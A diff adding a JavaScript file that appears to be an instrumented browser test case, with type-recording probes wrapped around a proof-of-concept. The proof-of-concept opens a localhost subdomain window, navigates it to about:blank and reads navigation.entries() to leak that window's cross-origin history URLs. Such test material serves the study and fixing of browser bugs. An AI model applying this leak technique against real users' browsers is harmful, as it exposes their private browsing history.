@@ -1,0 +1,136 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+      // Function takes a window object
+      // and a name of an element to store the leak
+try { if (Inst0 <= 1000 && typeof (hack) != "undefined") {_RecordType("<111,115,4>",(hack)); Inst0++; } } catch(e) {}
+      function hack(w, t) {
+try { if (Inst1 <= 1000 && typeof (w) != "undefined") {_RecordType("<116,117,4>",(w)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (t) != "undefined") {_RecordType("<119,120,4>",(t)); Inst2++; } } catch(e) {}
+        w.location = "about:blank";
+try { if (Inst3 <= 1000 && typeof (w.location) != "undefined") {_RecordType("<133,143,5>",(w.location)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (w) != "undefined") {_RecordType("<133,134,5>",(w)); Inst4++; } } catch(e) {}
+try { if (Inst5 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<170,180,6>",(setTimeout)); Inst5++; } } catch(e) {}
+        setTimeout(() => {
+try { if (Inst7 <= 1000 && typeof (w.navigation.entries) != "undefined") {_RecordType("<214,234,7>",(w.navigation.entries)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (w.navigation) != "undefined") {_RecordType("<214,226,7>",(w.navigation)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (w) != "undefined") {_RecordType("<214,215,7>",(w)); Inst9++; } } catch(e) {}
+          let entries = w.navigation.entries();
+try { if (Inst6 <= 1000 && typeof (entries) != "undefined") {_RecordType("<204,211,7>",(entries)); Inst6++; } } catch(e) {}
+try { if (Inst10 <= 1000 && typeof (w.history.back) != "undefined") {_RecordType("<249,263,8>",(w.history.back)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (w.history) != "undefined") {_RecordType("<249,258,8>",(w.history)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (w) != "undefined") {_RecordType("<249,250,8>",(w)); Inst12++; } } catch(e) {}
+          w.history.back(); // To restore the page after the leak
+try { if (Inst14 <= 1000 && typeof (document.getElementById) != "undefined") {_RecordType("<329,352,9>",(document.getElementById)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (document) != "undefined") {_RecordType("<329,337,9>",(document)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (t) != "undefined") {_RecordType("<353,354,9>",(t)); Inst16++; } } catch(e) {}
+          let target = document.getElementById(t);
+try { if (Inst13 <= 1000 && typeof (target) != "undefined") {_RecordType("<320,326,9>",(target)); Inst13++; } } catch(e) {}
+          target.innerHTML = "";
+try { if (Inst17 <= 1000 && typeof (target.innerHTML) != "undefined") {_RecordType("<368,384,10>",(target.innerHTML)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (target) != "undefined") {_RecordType("<368,374,10>",(target)); Inst18++; } } catch(e) {}
+          for (e of entries) {
+try { if (Inst19 <= 1000 && typeof (e) != "undefined") {_RecordType("<407,408,11>",(e)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (entries) != "undefined") {_RecordType("<412,419,11>",(entries)); Inst20++; } } catch(e) {}
+try { if (Inst21 <= 1000 && typeof (target.append) != "undefined") {_RecordType("<436,449,12>",(target.append)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (target) != "undefined") {_RecordType("<436,442,12>",(target)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (e.url) != "undefined") {_RecordType("<450,455,12>",(e.url)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (e) != "undefined") {_RecordType("<450,451,12>",(e)); Inst24++; } } catch(e) {}
+            target.append(e.url);
+try { if (Inst25 <= 1000 && typeof (target.append) != "undefined") {_RecordType("<471,484,13>",(target.append)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (target) != "undefined") {_RecordType("<471,477,13>",(target)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<485,507,13>",(document.createElement)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (document) != "undefined") {_RecordType("<485,493,13>",(document)); Inst28++; } } catch(e) {}
+            target.append(document.createElement("br"));
+          }
+        }, 400);
+      }
+      // Window object placeholder
+      var newWin;
+try { if (Inst29 <= 1000 && typeof (newWin) != "undefined") {_RecordType("<603,609,18>",(newWin)); Inst29++; } } catch(e) {}
+
+      // Open a new window
+try { if (Inst30 <= 1000 && typeof (pop) != "undefined") {_RecordType("<657,660,21>",(pop)); Inst30++; } } catch(e) {}
+      function pop() {
+try { if (Inst32 <= 1000 && typeof (window.open) != "undefined") {_RecordType("<683,694,22>",(window.open)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (window) != "undefined") {_RecordType("<683,689,22>",(window)); Inst33++; } } catch(e) {}
+        newWin = window.open("http://sub2.domain.localhost");
+try { if (Inst31 <= 1000 && typeof (newWin) != "undefined") {_RecordType("<674,680,22>",(newWin)); Inst31++; } } catch(e) {}
+      }
+
+      // Leak from the window
+try { if (Inst34 <= 1000 && typeof (pull) != "undefined") {_RecordType("<786,790,26>",(pull)); Inst34++; } } catch(e) {}
+      function pull() {
+try { if (Inst35 <= 1000 && typeof (hack) != "undefined") {_RecordType("<804,808,27>",(hack)); Inst35++; } } catch(e) {}try { if (Inst36 <= 1000 && typeof (newWin) != "undefined") {_RecordType("<809,815,27>",(newWin)); Inst36++; } } catch(e) {}
+        hack(newWin, "y");
+      }
+    
